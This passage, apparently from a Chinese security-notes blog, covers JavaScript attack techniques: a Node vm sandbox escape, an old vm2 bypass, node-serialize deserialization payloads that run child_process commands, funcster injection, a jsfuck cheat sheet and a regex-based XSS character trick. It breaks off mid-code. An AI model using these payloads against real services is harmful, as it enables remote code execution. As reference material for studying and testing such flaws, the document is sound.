&lt;p&gt;在原生的沙箱模块中，常用的逃逸方式为：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; vm &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;vm&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; sandbox &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; whatIsThis &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; vm&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;runInNewContext&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token template-string&#34;&gt;&lt;span class=&#34;token template-punctuation string&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    const ForeignObject = this.constructor;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    const ForeignFunction = ForeignObject.constructor;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    const process = ForeignFunction(&#34;return process&#34;)();&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    const require = process.mainModule.require;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    require(&#34;fs&#34;);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token template-punctuation string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sandbox&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;考虑到 JavaScript 原生 vm 模块的缺陷，有开发者设计了 vm2 来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;vm&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;runInNewContext&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token string&#34;&gt;&#39;Promise.resolve().then(()=&gt;&amp;#123;while(1)console.log(&#34;foo&#34;, Date.now());&amp;#125;); while(1)console.log(Date.now())&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token literal-property property&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;apply&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;console&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;arguments&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token literal-property property&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h1&gt;
&lt;h2 id=&#34;简介-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-4&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;JavaScript 本身并没有反序列化的实现，但是一些库如 node-serialize、serialize-to-js 等支持了反序列化功能。这些库通常使用 JSON 形式来存储数据，但是和原生函数 JSON.parse、 JSON.stringify 不同，这些库支持任何对象的反序列化，特别是函数，如果使用不当，则可能会出现反序列化问题。&lt;/p&gt;
&lt;h2 id=&#34;payload构造&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload构造&#34;&gt;#&lt;/a&gt; Payload 构造&lt;/h2&gt;
&lt;p&gt;下面是一个最简单的例子，首先获得序列化后的输出&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function-variable function&#34;&gt;rce&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;child_process&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ls /&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;error&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stderr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;stdout&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; serialize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node-serialize&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Serialized: \n&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; serialize&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;上面执行后会返回&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;quot;rce&amp;quot;:&amp;quot;_$$ND_FUNC$$_function ()&amp;#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;, function(error, stdout, stderr) &amp;#123; console.log(stdout) &amp;#125;);&amp;#125;&amp;quot;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不过这段 payload 反序列化后并不会执行，但是在 JS 中支持立即调用的函数表达式（Immediately Invoked Function Expression），比如  &lt;code&gt;(function () &amp;#123; /* code */ &amp;#125; ());&lt;/code&gt;  这样就会执行函数中的代码。那么可以使用这种方法修改序列化后的字符串来完成一次反序列化。最后的 payload 测试如下:&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; serialize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node-serialize&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;#123;&#34;rce&#34;:&#34;_$$ND_FUNC$$_function ()&amp;#123;require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;, function(error, stdout, stderr) &amp;#123; console.log(stdout) &amp;#125;);&amp;#125;()&#34;&amp;#125;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;serialize&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;payload构造-ii&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload构造-ii&#34;&gt;#&lt;/a&gt; Payload 构造 II&lt;/h2&gt;
&lt;p&gt;以上提到的是 node-serialize 这类反序列化库的构造方式，还有一类库如 funcster，是使用直接拼接字符串构造函数的方式来执行。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;return &amp;quot;module.exports=(function(module,exports)&amp;#123;return&amp;#123;&amp;quot; + entries + &amp;quot;&amp;#125;;&amp;#125;)();&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这种方式可以使用相应的闭合来构造 payload。&lt;/p&gt;
&lt;h1 id=&#34;jsfuck-cheat-sheet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsfuck-cheat-sheet&#34;&gt;#&lt;/a&gt; jsfuck cheat sheet&lt;/h1&gt;
&lt;h2 id=&#34;basic-values&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#basic-values&#34;&gt;#&lt;/a&gt; Basic values&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;undefined&lt;/code&gt;  &amp;gt;  &lt;code&gt;[][[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;false&lt;/code&gt;  &amp;gt;  &lt;code&gt;![]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;true&lt;/code&gt;  &amp;gt;  &lt;code&gt;!![]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;NaN&lt;/code&gt;  &amp;gt;  &lt;code&gt;+[![]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt;  &amp;gt;  &lt;code&gt;+[]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt;  &amp;gt;  &lt;code&gt;+!+[]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;2&lt;/code&gt;  &amp;gt;  &lt;code&gt;!+[]+!+[]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;basic-strings&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#basic-strings&#34;&gt;#&lt;/a&gt; Basic strings&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+[]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;undefined&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+[][[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;false&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+![]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;true&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+!![]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;NaN&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+(+[![]])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;0&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+(+[])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;1&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+(+!+[])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;2&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+(!+[]+!+[])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;10&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[+!+[]]+[+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;11&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[+!+[]]+[+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;100&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[+!+[]]+[+[]]+(+[])&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;higher-numbers&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#higher-numbers&#34;&gt;#&lt;/a&gt; Higher numbers&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;10&lt;/code&gt;  &amp;gt;  &lt;code&gt;+([+!+[]]+[+[]])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;11&lt;/code&gt;  &amp;gt;  &lt;code&gt;+([+!+[]]+[+!+[]])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;100&lt;/code&gt;  &amp;gt;  &lt;code&gt;+([+!+[]]+[+[]]+(+[]))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;string-alphabet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#string-alphabet&#34;&gt;#&lt;/a&gt; String alphabet&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;a&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+![])[+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;d&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+[][[]])[+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;e&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+!+[])[+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;f&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+![])[+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;i&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+[][[]])[+!+[]+!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;l&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+![])[+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;n&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+[][[]])[+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;r&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+!+[])[+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;s&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+![])[+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;t&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+!+[])[+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;u&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;([]+!+[])[+!+[]+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;trick&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#trick&#34;&gt;#&lt;/a&gt; Trick&lt;/h1&gt;
&lt;h2 id=&#34;通过正则表达式构造特定字符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过正则表达式构造特定字符&#34;&gt;#&lt;/a&gt; 通过正则表达式构造特定字符&lt;/h2&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;empty &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;RegExp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;flags&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;regSource &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;RegExp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;source &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;regSource&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;toString &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;shift&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;regSource&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;length &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;left  &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; regSource &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; empty &lt;span class=&#34;token comment&#34;&gt;// 生成 (&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;quest &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; regSource &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; empty &lt;span class=&#34;token comment&#34;&gt;// 生成？&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;colon &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; regSource &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; empty &lt;span class=&#34;token comment&#34;&gt;// 生成 :&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;right &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; regSource &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; empty &lt;span class=&#34;token comment&#34;&gt;// 生成 )&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;source &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;xss&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;flags &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 